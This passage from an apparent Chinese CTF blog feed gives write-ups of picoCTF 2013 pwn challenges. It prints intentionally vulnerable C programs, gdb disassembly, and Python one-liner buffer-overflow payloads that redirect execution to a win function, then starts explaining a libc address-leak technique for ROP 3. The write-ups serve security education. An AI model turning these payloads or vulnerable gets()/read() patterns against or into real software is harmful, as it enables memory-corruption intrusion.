+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-34&quot; title=&quot;34&quot;&gt;  gid_t gid = getegid();&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-35&quot; title=&quot;35&quot;&gt;  setresgid(gid, gid, gid);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-36&quot; title=&quot;36&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-37&quot; title=&quot;37&quot;&gt;  puts(&lt;span class=&quot;st&quot;&gt;&amp;quot;Please enter your string: &amp;quot;&lt;/span&gt;);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-38&quot; title=&quot;38&quot;&gt;  vuln();&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-39&quot; title=&quot;39&quot;&gt;  &lt;span class=&quot;cf&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-40&quot; title=&quot;40&quot;&gt;}&lt;/a&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;div&gt;
+&lt;div id=&quot;writeup_show_button&quot; style=&quot;cursor: pointer&quot;&gt;
+    &lt;div class=&quot;alert alert-warning&quot;&gt;
+        &lt;b&gt;&lt;i class=&quot;fas fa-exclamation-circle&quot;&gt;&lt;/i&gt; 点击此处显示 Writeup&lt;/b&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;writeup_hide_button&quot; style=&quot;cursor: pointer&quot; class=&quot;d-none&quot;&gt;
+    &lt;div class=&quot;alert alert-info&quot;&gt;
+        &lt;b&gt;&lt;i class=&quot;fas fa-exclamation-circle&quot;&gt;&lt;/i&gt; 点击此处隐藏 Writeup&lt;/b&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;script&gt;
+(function()
+{
+    var parent = document.scripts[document.scripts.length - 1].parentNode;
+    parent.querySelector(&quot;#writeup_show_button&quot;).onclick = function ()
+    {
+        parent.querySelector(&quot;#writeup_hide_button&quot;).classList.remove(&quot;d-none&quot;);
+        parent.querySelector(&quot;#writeup_show_button&quot;).classList.add(&quot;d-none&quot;);
+        parent.querySelector(&quot;#writeup&quot;).classList.remove(&quot;d-none&quot;);
+    }
+    parent.querySelector(&quot;#writeup_hide_button&quot;).onclick = function ()
+    {
+        parent.querySelector(&quot;#writeup_hide_button&quot;).classList.add(&quot;d-none&quot;);
+        parent.querySelector(&quot;#writeup_show_button&quot;).classList.remove(&quot;d-none&quot;);
+        parent.querySelector(&quot;#writeup&quot;).classList.add(&quot;d-none&quot;);
+    }
+})();
+&lt;/script&gt;
+&lt;div id=&quot;writeup&quot; class=&quot;d-none&quot; markdown=&quot;1&quot;&gt;
+&lt;p&gt;只需要覆盖掉返回地址即可。看一下 &lt;code&gt;win&lt;/code&gt; 的地址，以及缓冲区大小：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;(gdb) print win
+$1 = {&amp;lt;text variable, no debug info&amp;gt;} 0x80485cb &amp;lt;win&amp;gt;
+(gdb) disas vuln
+Dump of assembler code for function vuln:
+   0x0804862f &amp;lt;+0&amp;gt;:     push   %ebp
+   0x08048630 &amp;lt;+1&amp;gt;:     mov    %esp,%ebp
+   0x08048632 &amp;lt;+3&amp;gt;:     sub    $0x28,%esp
+   0x08048635 &amp;lt;+6&amp;gt;:     sub    $0xc,%esp
+   0x08048638 &amp;lt;+9&amp;gt;:     lea    -0x28(%ebp),%eax
+   0x0804863b &amp;lt;+12&amp;gt;:    push   %eax
+   0x0804863c &amp;lt;+13&amp;gt;:    call   0x8048430 &amp;lt;gets@plt&amp;gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;缓冲区大小为 &lt;code&gt;0x28&lt;/code&gt;。因此&lt;/p&gt;
+&lt;div class=&quot;sourceCode&quot; id=&quot;cb5&quot;&gt;&lt;pre class=&quot;sourceCode python&quot;&gt;&lt;code class=&quot;sourceCode python&quot;&gt;&lt;a class=&quot;sourceLine&quot; id=&quot;cb5-1&quot; title=&quot;1&quot;&gt;python &lt;span class=&quot;op&quot;&gt;-&lt;/span&gt;c &lt;span class=&quot;st&quot;&gt;&amp;quot;print &amp;#39;0&amp;#39;*0x28 + &amp;#39;0000&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\xcb\x85\x04\x08\n&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;#39;&amp;quot;&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;|&lt;/span&gt; .&lt;span class=&quot;op&quot;&gt;/&lt;/span&gt;vuln&lt;/a&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h3 id=&quot;第-2-题&quot;&gt;第 2 题&lt;/h3&gt;
+&lt;div class=&quot;sourceCode&quot; id=&quot;cb6&quot;&gt;&lt;pre class=&quot;sourceCode c&quot;&gt;&lt;code class=&quot;sourceCode c&quot;&gt;&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-1&quot; title=&quot;1&quot;&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-2&quot; title=&quot;2&quot;&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-3&quot; title=&quot;3&quot;&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-4&quot; title=&quot;4&quot;&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-5&quot; title=&quot;5&quot;&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-6&quot; title=&quot;6&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-7&quot; title=&quot;7&quot;&gt;&lt;span class=&quot;pp&quot;&gt;#define BUFSIZE 100&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-8&quot; title=&quot;8&quot;&gt;&lt;span class=&quot;pp&quot;&gt;#define FLAGSIZE 64&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-9&quot; title=&quot;9&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-10&quot; title=&quot;10&quot;&gt;&lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; win(&lt;span class=&quot;dt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; arg1, &lt;span class=&quot;dt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; arg2) {&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-11&quot; title=&quot;11&quot;&gt;  &lt;span class=&quot;dt&quot;&gt;char&lt;/span&gt; buf[FLAGSIZE];&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-12&quot; title=&quot;12&quot;&gt;  &lt;span class=&quot;dt&quot;&gt;FILE&lt;/span&gt; *f = fopen(&lt;span class=&quot;st&quot;&gt;&amp;quot;flag.txt&amp;quot;&lt;/span&gt;,&lt;span class=&quot;st&quot;&gt;&amp;quot;r&amp;quot;&lt;/span&gt;);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-13&quot; title=&quot;13&quot;&gt;  &lt;span class=&quot;cf&quot;&gt;if&lt;/span&gt; (f == NULL) {&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-14&quot; title=&quot;14&quot;&gt;    printf(&lt;span class=&quot;st&quot;&gt;&amp;quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-15&quot; title=&quot;15&quot;&gt;    exit(&lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-16&quot; title=&quot;16&quot;&gt;  }&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-17&quot; title=&quot;17&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-18&quot; title=&quot;18&quot;&gt;  fgets(buf,FLAGSIZE,f);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-19&quot; title=&quot;19&quot;&gt;  &lt;span class=&quot;cf&quot;&gt;if&lt;/span&gt; (arg1 != &lt;span class=&quot;bn&quot;&gt;0xDEADBEEF&lt;/span&gt;)&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-20&quot; title=&quot;20&quot;&gt;    &lt;span class=&quot;cf&quot;&gt;return&lt;/span&gt;;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-21&quot; title=&quot;21&quot;&gt;  &lt;span class=&quot;cf&quot;&gt;if&lt;/span&gt; (arg2 != &lt;span class=&quot;bn&quot;&gt;0xDEADC0DE&lt;/span&gt;)&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-22&quot; title=&quot;22&quot;&gt;    &lt;span class=&quot;cf&quot;&gt;return&lt;/span&gt;;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-23&quot; title=&quot;23&quot;&gt;  printf(buf);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-24&quot; title=&quot;24&quot;&gt;}&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-25&quot; title=&quot;25&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-26&quot; title=&quot;26&quot;&gt;&lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; vuln(){&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-27&quot; title=&quot;27&quot;&gt;  &lt;span class=&quot;dt&quot;&gt;char&lt;/span&gt; buf[BUFSIZE];&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-28&quot; title=&quot;28&quot;&gt;  gets(buf);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-29&quot; title=&quot;29&quot;&gt;  puts(buf);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-30&quot; title=&quot;30&quot;&gt;}&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-31&quot; title=&quot;31&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-32&quot; title=&quot;32&quot;&gt;&lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; main(&lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; argc, &lt;span class=&quot;dt&quot;&gt;char&lt;/span&gt; **argv){&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-33&quot; title=&quot;33&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-34&quot; title=&quot;34&quot;&gt;  setvbuf(stdout, NULL, _IONBF, &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-35&quot; title=&quot;35&quot;&gt;  &lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-36&quot; title=&quot;36&quot;&gt;  gid_t gid = getegid();&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-37&quot; title=&quot;37&quot;&gt;  setresgid(gid, gid, gid);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-38&quot; title=&quot;38&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-39&quot; title=&quot;39&quot;&gt;  puts(&lt;span class=&quot;st&quot;&gt;&amp;quot;Please enter your string: &amp;quot;&lt;/span&gt;);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-40&quot; title=&quot;40&quot;&gt;  vuln();&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-41&quot; title=&quot;41&quot;&gt;  &lt;span class=&quot;cf&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb6-42&quot; title=&quot;42&quot;&gt;}&lt;/a&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;div&gt;
+&lt;div id=&quot;writeup_show_button&quot; style=&quot;cursor: pointer&quot;&gt;
+    &lt;div class=&quot;alert alert-warning&quot;&gt;
+        &lt;b&gt;&lt;i class=&quot;fas fa-exclamation-circle&quot;&gt;&lt;/i&gt; 点击此处显示 Writeup&lt;/b&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;writeup_hide_button&quot; style=&quot;cursor: pointer&quot; class=&quot;d-none&quot;&gt;
+    &lt;div class=&quot;alert alert-info&quot;&gt;
+        &lt;b&gt;&lt;i class=&quot;fas fa-exclamation-circle&quot;&gt;&lt;/i&gt; 点击此处隐藏 Writeup&lt;/b&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;script&gt;
+(function()
+{
+    var parent = document.scripts[document.scripts.length - 1].parentNode;
+    parent.querySelector(&quot;#writeup_show_button&quot;).onclick = function ()
+    {
+        parent.querySelector(&quot;#writeup_hide_button&quot;).classList.remove(&quot;d-none&quot;);
+        parent.querySelector(&quot;#writeup_show_button&quot;).classList.add(&quot;d-none&quot;);
+        parent.querySelector(&quot;#writeup&quot;).classList.remove(&quot;d-none&quot;);
+    }
+    parent.querySelector(&quot;#writeup_hide_button&quot;).onclick = function ()
+    {
+        parent.querySelector(&quot;#writeup_hide_button&quot;).classList.add(&quot;d-none&quot;);
+        parent.querySelector(&quot;#writeup_show_button&quot;).classList.remove(&quot;d-none&quot;);
+        parent.querySelector(&quot;#writeup&quot;).classList.add(&quot;d-none&quot;);
+    }
+})();
+&lt;/script&gt;
+&lt;div id=&quot;writeup&quot; class=&quot;d-none&quot; markdown=&quot;1&quot;&gt;
+&lt;p&gt;这次需要带两个参数调用 &lt;code&gt;win&lt;/code&gt;。查看一下 &lt;code&gt;win&lt;/code&gt; 的地址和缓冲区大小：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;(gdb) print win
+$1 = {&amp;lt;text variable, no debug info&amp;gt;} 0x80485cb &amp;lt;win&amp;gt;
+(gdb) disas vuln
+Dump of assembler code for function vuln:
+   0x08048646 &amp;lt;+0&amp;gt;:     push   %ebp
+   0x08048647 &amp;lt;+1&amp;gt;:     mov    %esp,%ebp
+   0x08048649 &amp;lt;+3&amp;gt;:     sub    $0x78,%esp
+   0x0804864c &amp;lt;+6&amp;gt;:     sub    $0xc,%esp
+   0x0804864f &amp;lt;+9&amp;gt;:     lea    -0x6c(%ebp),%eax
+   0x08048652 &amp;lt;+12&amp;gt;:    push   %eax
+   0x08048653 &amp;lt;+13&amp;gt;:    call   0x8048430 &amp;lt;gets@plt&amp;gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;缓冲区大小为 &lt;code&gt;0x6c&lt;/code&gt;。因此：&lt;/p&gt;
+&lt;div class=&quot;sourceCode&quot; id=&quot;cb8&quot;&gt;&lt;pre class=&quot;sourceCode python&quot;&gt;&lt;code class=&quot;sourceCode python&quot;&gt;&lt;a class=&quot;sourceLine&quot; id=&quot;cb8-1&quot; title=&quot;1&quot;&gt;                                                     ↓第一个参数      ↓第二个参数&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb8-2&quot; title=&quot;2&quot;&gt;python &lt;span class=&quot;op&quot;&gt;-&lt;/span&gt;c &lt;span class=&quot;st&quot;&gt;&amp;quot;print &amp;#39;0&amp;#39;*0x6c + &amp;#39;0000&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\xcb\x85\x04\x08&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;RETN&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\xef\xbe\xad\xde\xde\xc0\xad\xde\n&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;#39;&amp;quot;&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;|&lt;/span&gt; .&lt;span class=&quot;op&quot;&gt;/&lt;/span&gt;vuln&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb8-3&quot; title=&quot;3&quot;&gt;                            ↑EBP ↑返回跳至win     ↑win的返回地址&lt;/a&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;/div&gt;</content><author><name></name></author><category term="pwn" /><summary type="html">因为这几道题都比较简单，所以合并在一起了：</summary></entry><entry><title type="html">ROP 3</title><link href="https://ctf.dontpanic.blog/writeups/picoctf-2013-rop-3.html" rel="alternate" type="text/html" title="ROP 3" /><published>2019-02-24T00:00:00+00:00</published><updated>2019-02-24T00:00:00+00:00</updated><id>https://ctf.dontpanic.blog/writeups/picoctf-2013-rop-3</id><content type="html" xml:base="https://ctf.dontpanic.blog/writeups/picoctf-2013-rop-3.html">&lt;p&gt;这是 &lt;a href=&quot;/writeups/picoctf-2013-rop-2.html&quot;&gt;ROP 2&lt;/a&gt; 的进阶版。程序不再导入 &lt;code&gt;system&lt;/code&gt; 函数，也没有现成的 “/bin/sh” 字符串了：&lt;/p&gt;
+&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode c&quot;&gt;&lt;code class=&quot;sourceCode c&quot;&gt;&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-1&quot; title=&quot;1&quot;&gt;&lt;span class=&quot;pp&quot;&gt;#undef _FORTIFY_SOURCE&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-2&quot; title=&quot;2&quot;&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-3&quot; title=&quot;3&quot;&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-4&quot; title=&quot;4&quot;&gt;&lt;span class=&quot;pp&quot;&gt;#include &lt;/span&gt;&lt;span class=&quot;im&quot;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-5&quot; title=&quot;5&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-6&quot; title=&quot;6&quot;&gt;&lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; vulnerable_function()  {&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-7&quot; title=&quot;7&quot;&gt;    &lt;span class=&quot;dt&quot;&gt;char&lt;/span&gt; buf[&lt;span class=&quot;dv&quot;&gt;128&lt;/span&gt;];&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-8&quot; title=&quot;8&quot;&gt;    read(STDIN_FILENO, buf,&lt;span class=&quot;dv&quot;&gt;256&lt;/span&gt;);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-9&quot; title=&quot;9&quot;&gt;}&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-10&quot; title=&quot;10&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-11&quot; title=&quot;11&quot;&gt;&lt;span class=&quot;dt&quot;&gt;void&lt;/span&gt; be_nice_to_people() {&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-12&quot; title=&quot;12&quot;&gt;    &lt;span class=&quot;co&quot;&gt;// /bin/sh is usually symlinked to bash, which usually drops privs. Make&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-13&quot; title=&quot;13&quot;&gt;    &lt;span class=&quot;co&quot;&gt;// sure we don&amp;#39;t drop privs if we exec bash, (ie if we call system()).&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-14&quot; title=&quot;14&quot;&gt;    gid_t gid = getegid();&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-15&quot; title=&quot;15&quot;&gt;    setresgid(gid, gid, gid);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-16&quot; title=&quot;16&quot;&gt;}&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-17&quot; title=&quot;17&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-18&quot; title=&quot;18&quot;&gt;&lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; main(&lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; argc, &lt;span class=&quot;dt&quot;&gt;char&lt;/span&gt;** argv) {&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-19&quot; title=&quot;19&quot;&gt;    be_nice_to_people();&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-20&quot; title=&quot;20&quot;&gt;    vulnerable_function();&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-21&quot; title=&quot;21&quot;&gt;    write(STDOUT_FILENO, &lt;span class=&quot;st&quot;&gt;&amp;quot;Hello, World&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;, &lt;span class=&quot;dv&quot;&gt;13&lt;/span&gt;);&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-22&quot; title=&quot;22&quot;&gt;}&lt;/a&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;div&gt;
+&lt;div id=&quot;writeup_show_button&quot; style=&quot;cursor: pointer&quot;&gt;
+    &lt;div class=&quot;alert alert-warning&quot;&gt;
+        &lt;b&gt;&lt;i class=&quot;fas fa-exclamation-circle&quot;&gt;&lt;/i&gt; 点击此处显示 Writeup&lt;/b&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;writeup_hide_button&quot; style=&quot;cursor: pointer&quot; class=&quot;d-none&quot;&gt;
+    &lt;div class=&quot;alert alert-info&quot;&gt;
+        &lt;b&gt;&lt;i class=&quot;fas fa-exclamation-circle&quot;&gt;&lt;/i&gt; 点击此处隐藏 Writeup&lt;/b&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;script&gt;
+(function()
+{
+    var parent = document.scripts[document.scripts.length - 1].parentNode;
+    parent.querySelector(&quot;#writeup_show_button&quot;).onclick = function ()
+    {
+        parent.querySelector(&quot;#writeup_hide_button&quot;).classList.remove(&quot;d-none&quot;);
+        parent.querySelector(&quot;#writeup_show_button&quot;).classList.add(&quot;d-none&quot;);
+        parent.querySelector(&quot;#writeup&quot;).classList.remove(&quot;d-none&quot;);
+    }
+    parent.querySelector(&quot;#writeup_hide_button&quot;).onclick = function ()
+    {
+        parent.querySelector(&quot;#writeup_hide_button&quot;).classList.add(&quot;d-none&quot;);
+        parent.querySelector(&quot;#writeup_show_button&quot;).classList.remove(&quot;d-none&quot;);
+        parent.querySelector(&quot;#writeup&quot;).classList.add(&quot;d-none&quot;);
+    }
+})();
+&lt;/script&gt;
+&lt;div id=&quot;writeup&quot; class=&quot;d-none&quot; markdown=&quot;1&quot;&gt;
+&lt;p&gt;目前，绝大多数系统都有 ASLR（地址空间随机化）机制。在 ASLR 开启的情况下，动态库、栈空间的地址每次执行都会随机变化，这让确定栈上的缓冲区地址、确定动态库中的函数地址更加困难。对于可执行程序来说，如果编译时使用了 &lt;code&gt;-pie&lt;/code&gt; 编译选项（生成位置无关的可执行程序），则在执行这个程序时，它的加载地址也会随机化；如果指定了 &lt;code&gt;-no-pie&lt;/code&gt; 选项，则每次加载的地址都是固定的。我们可以通过 &lt;code&gt;file&lt;/code&gt; 命令来查看一个可执行文件中的代码是否是位置无关的：&lt;/p&gt;
+&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-1&quot; title=&quot;1&quot;&gt;&lt;span class=&quot;ex&quot;&gt;dontpanic@Ubuntu&lt;/span&gt;:~$ gcc -no-pie test.c&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-2&quot; title=&quot;2&quot;&gt;&lt;span class=&quot;ex&quot;&gt;dontpanic@Ubuntu&lt;/span&gt;:~$ file a.out&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-3&quot; title=&quot;3&quot;&gt;&lt;span class=&quot;ex&quot;&gt;a.out&lt;/span&gt;: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), &lt;span class=&quot;ex&quot;&gt;dynamically&lt;/span&gt; linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=b6a30608d5278aba091e7f52f2a7fd25e7c745a9, not stripped&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-4&quot; title=&quot;4&quot;&gt;&lt;span class=&quot;ex&quot;&gt;dontpanic@Ubuntu&lt;/span&gt;:~$&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-5&quot; title=&quot;5&quot;&gt;&lt;span class=&quot;ex&quot;&gt;dontpanic@Ubuntu&lt;/span&gt;:~$&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-6&quot; title=&quot;6&quot;&gt;&lt;span class=&quot;ex&quot;&gt;dontpanic@Ubuntu&lt;/span&gt;:~$ gcc -pie test.c&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-7&quot; title=&quot;7&quot;&gt;&lt;span class=&quot;ex&quot;&gt;dontpanic@Ubuntu&lt;/span&gt;:~$ file a.out&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-8&quot; title=&quot;8&quot;&gt;&lt;span class=&quot;ex&quot;&gt;a.out&lt;/span&gt;: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), &lt;span class=&quot;ex&quot;&gt;dynamically&lt;/span&gt; linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=75017e995c8e398060095542ea11b2bb1445a965, not stripped&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-9&quot; title=&quot;9&quot;&gt;&lt;span class=&quot;ex&quot;&gt;dontpanic@Ubuntu&lt;/span&gt;:~$&lt;/a&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;rop3 程序采用了 &lt;code&gt;-no-pie&lt;/code&gt;，这为我们的爆破带来了便利。&lt;/p&gt;
+&lt;p&gt;程序的导入表中存放有导入函数的真实地址，这些地址每次运行都会不同——这是因为在每一次程序执行时，动态库都会加载在不同的地址上。然而，虽然每一次动态库的加载地址不同，但同一动态库内部的函数之间的相对地址仍然不变，我们可以根据已导入的函数的真实地址来计算得出目标函数的真实地址。&lt;/p&gt;
+&lt;p&gt;这道题目的程序导入了 &lt;code&gt;read&lt;/code&gt; 和 &lt;code&gt;write&lt;/code&gt;，这让我们有机会通过 &lt;code&gt;write&lt;/code&gt; 打印出它们的真实地址，从而能够计算出 &lt;code&gt;system&lt;/code&gt; 函数的真实地址。这三个函数都是 &lt;code&gt;libc&lt;/code&gt; 中的函数，因此它们相互之间的相对距离是不变的：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/local/posts/picoctf-2013-rop-3/libc.png&quot; alt=&quot;libc&quot; /&gt;&lt;/p&gt;
